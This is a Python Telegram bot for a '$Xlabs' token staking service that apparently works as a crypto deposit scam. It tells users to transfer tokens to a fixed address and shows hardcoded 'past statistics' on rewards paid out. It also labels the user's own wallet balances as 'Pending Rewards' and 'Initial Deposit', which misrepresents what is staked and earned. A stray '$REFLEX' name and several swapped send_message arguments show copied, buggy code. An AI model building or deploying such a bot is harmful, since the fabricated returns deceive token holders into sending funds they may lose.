import telebot
import requests
# tg bot token
token = ''
bot = telebot.TeleBot(token)
# add name token
name_token = '$Xlabs'
# add calculation after add other info
all_amount_token = 21_000_000
# percent_staked = '22.6364'
eth_amount = '0.41812322'
eth_distributed = '10.48016622'

# add stake address
stake_address = ''
# dont touch api key
api_key = ""
# add contract address your token
contract_address = ""


def get_eth_balance(address, api_key):
    url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}"
    response = requests.get(url)
    data = response.json()
    if data['message'] == 'OK':
        return int(data['result']) / 1e18  # Convert Wei to ETH
    return None


def get_token_balance(address, contract_address, api_key):
    url = f"https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress={contract_address}&address={address}&tag=latest&apikey={api_key}"
    response = requests.get(url)
    data = response.json()
    if data['message'] == 'OK':
        return int(data['result']) / 1e18  # Assuming the token has 18 decimals
    return None


def check_wallet(message):
    chat_id = message.chat.id
    address = message.text

    # address = ""

    eth_balance = get_eth_balance(address, api_key)
    token_balance = get_token_balance(address, contract_address, api_key)
    msg = f"""🏦 Initial Deposit: {token_balance} {name_token}
💰 Pending Rewards: {eth_balance} ETH
"""
    bot.send_message(
        chat_id, msg
    )
    # print(f"ETH Balance: {eth_balance} ETH")
    # print(f"Token Balance: {token_balance} TOKEN_NAME")


@bot.message_handler(commands=['stake'])
def send_welcome(message):
    # user_id = message.from_user.id
    chat_id = message.chat.id
    msg = f"""✔️ Start farming ETH by staking your {name_token} tokens, simply transfer them to this address:
<code>{stake_address}</code>

⚠️ Note: Staked tokens are locked for a duration of 1 week"""
    bot.send_message(
        msg, chat_id, parse_mode='html'
    )


@bot.message_handler(commands=['withdraw'])
def send_welcome(message):
    # user_id = message.from_user.id
    chat_id = message.chat.id
    msg = f"""💰 Withdraw function is only available 1 week after the moment you staked your tokens, if you think it’s passed, please do follow these steps:

1. Browse to https://etherscan.io/address/{stake_address}#writeContract
2. Connect the wallet from where you staked your tokens
3. Click on 'withdraw()' function then write and confirm the transaction

✅ Note: Pending ETH gains are sent alongside your previously staked {name_token} tokens"""
    bot.send_message(
        msg, chat_id, disable_web_page_preview=True
    )


@bot.message_handler(commands=['claim'])
def send_welcome(message):
    # user_id = message.from_user.id
    chat_id = message.chat.id
    msg = f"""💰 Claim function is available whenever you have pending ETH gains, to claim your gains, please do follow these steps:

1. Browse to https://etherscan.io/address/{stake_address}#writeContract
2. Connect the wallet from where you staked your tokens
3. Click on 'claim()' function then write and confirm the transaction"""
    bot.send_message(
        msg, chat_id, disable_web_page_preview=True
    )


@bot.message_handler(commands=['status'])
def send_welcome(message):
    # user_id = message.from_user.id
    chat_id = message.chat.id
    msg = f"🏦 Paste the wallet address you staked $REFLEX with:"
    mesag = bot.send_message(
        msg, chat_id
    )
    bot.register_next_step_handler(mesag, check_wallet)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    # user_id = message.from_user.id
    percent_staked = get_token_balance(stake_address, contract_address, api_key) * 100 / all_amount_token
    chat_id = message.chat.id
    msg = f"""Ready to make a dangerous amount of passive income? 🫐

// Some past statistics about the bot:

🔒 Percentage of {name_token} locked: {percent_staked}%
💰 Cumulated rewards per {name_token} staked: {eth_amount} ETH
🏦 Cumulated rewards distributed: {eth_distributed} ETH
⏰ Distributed since the 8/21/2023, 3:12:59 PM UTC

// Commands:

• '/stake' - Stake Tokens
• '/withdraw' - Withdraw Tokens & Claim Pending Rewards
• '/claim' - Claim Pending Rewards
• '/status' - Display your Stake Status"""
    bot.send_message(
        msg, chat_id
    )


bot.infinity_polling()
